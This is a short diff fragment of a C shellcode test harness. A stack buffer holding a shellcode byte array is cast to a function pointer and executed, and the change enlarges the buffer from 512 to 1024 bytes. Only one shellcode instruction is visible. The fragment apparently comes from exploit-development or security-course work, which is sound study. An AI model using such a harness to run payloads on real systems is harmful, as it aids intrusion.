@@ -57,7 +57,7 @@ char shellcode[] = "\x31\xd2"             // xor    %edx,%edx
 */
 
 void main() {
-  char attackStr[512];
+  char attackStr[1024];
   strcpy(attackStr, shellcode);
   ((void (*)())attackStr)();
 }
